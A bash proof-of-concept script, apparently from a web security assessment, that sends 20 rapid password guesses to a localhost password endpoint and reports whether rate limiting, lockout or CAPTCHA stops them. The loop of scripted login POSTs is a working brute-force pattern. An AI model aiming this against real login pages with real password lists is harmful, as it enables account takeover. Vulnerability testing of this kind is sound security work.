#!/bin/bash

# POC: Brute Force Attack on Password Endpoint - No Rate Limiting Protection
# Target: http://localhost:8080/password/{username}
# Demonstrates: Lack of rate limiting, account lockout, or CAPTCHA protection

TARGET_BASE="http://localhost:8080"
USERNAME="test"
USER_ID="10032"
ATTEMPT_COUNT=20  # Reduced from 100 for faster testing
SUCCESS_COUNT=0
HTTP_400_COUNT=0
HTTP_302_COUNT=0
RATE_LIMIT_TRIGGERED=0

echo "=========================================="
echo "Brute Force POC - Password Endpoint"
echo "=========================================="
echo "Target: $TARGET_BASE/password/$USERNAME"
echo "Username: $USERNAME"
echo "User ID: $USER_ID"
echo "Attempting $ATTEMPT_COUNT consecutive password guesses..."
echo ""

# First, let's establish a session by visiting the password page
echo "[*] Establishing session..."
curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt "$TARGET_BASE/password/$USERNAME" > /dev/null

# Array to store response codes
declare -a RESPONSE_CODES

for i in $(seq 1 $ATTEMPT_COUNT); do
    PASSWORD="bruteforcetest${i}"
    
    # Submit the password attempt with proper session handling
    RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_BASE/password/$USERNAME" \
        -c /tmp/cookies.txt -b /tmp/cookies.txt \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=${USERNAME}&user_id=${USER_ID}&password=${PASSWORD}" \
        -L --max-redirs 0)
    
    # Extract status code (last line)
    HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
    
    # Count response codes
    if [ "$HTTP_CODE" == "400" ]; then
        HTTP_400_COUNT=$((HTTP_400_COUNT + 1))
    elif [ "$HTTP_CODE" == "302" ]; then
        HTTP_302_COUNT=$((HTTP_302_COUNT + 1))
        SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
    fi
    
    # Check for rate limiting
    if [ "$HTTP_CODE" == "429" ]; then
        RATE_LIMIT_TRIGGERED=1
        echo "Attempt $i: HTTP $HTTP_CODE - Rate limiting triggered!"
        break
    elif [ "$HTTP_CODE" == "503" ]; then
        echo "Attempt $i: HTTP $HTTP_CODE - Service unavailable (possible protection)"
        RATE_LIMIT_TRIGGERED=1
        break
    elif [ "$HTTP_CODE" == "302" ]; then
        if [ $((i % 5)) -eq 0 ]; then
            echo "Attempt $i: HTTP $HTTP_CODE - Password attempt accepted (no rate limiting)"
        fi
    elif [ "$HTTP_CODE" == "400" ]; then
        if [ $i -eq 1 ]; then
            echo "Attempt $i: HTTP $HTTP_CODE - Note: Endpoint returns 400 for bad requests"
        fi
    fi
done

echo ""
echo "=========================================="
echo "POC Results Summary"
echo "=========================================="
echo "Total Attempts: $ATTEMPT_COUNT"
echo "HTTP 400 Responses: $HTTP_400_COUNT"
echo "HTTP 302 Responses: $HTTP_302_COUNT"
echo "Successful (302) Password Attempts: $SUCCESS_COUNT"
echo "Rate Limiting Triggered (429/503): $RATE_LIMIT_TRIGGERED"
echo ""

# Check vulnerability - if we got any successful attempts or got 400s consistently without rate limiting
if { [ $HTTP_302_COUNT -gt 0 ] || [ $HTTP_400_COUNT -ge 5 ]; } && [ $RATE_LIMIT_TRIGGERED -eq 0 ]; then
    echo "✓ VULNERABILITY CONFIRMED"
    echo "  - Endpoint accepted multiple consecutive attempts"
    echo "  - No HTTP 429 (Too Many Requests) rate limiting triggered"
    echo "  - No HTTP 503 (Service Unavailable) triggered"
    echo "  - No account lockout protection observed"
    echo "  - Brute force attacks are possible without protection"
    rm -f /tmp/cookies.txt
    exit 0
else
    echo "✗ Vulnerability check inconclusive"
    echo "  - Unable to confirm lack of rate limiting"
    rm -f /tmp/cookies.txt
    exit 1
fi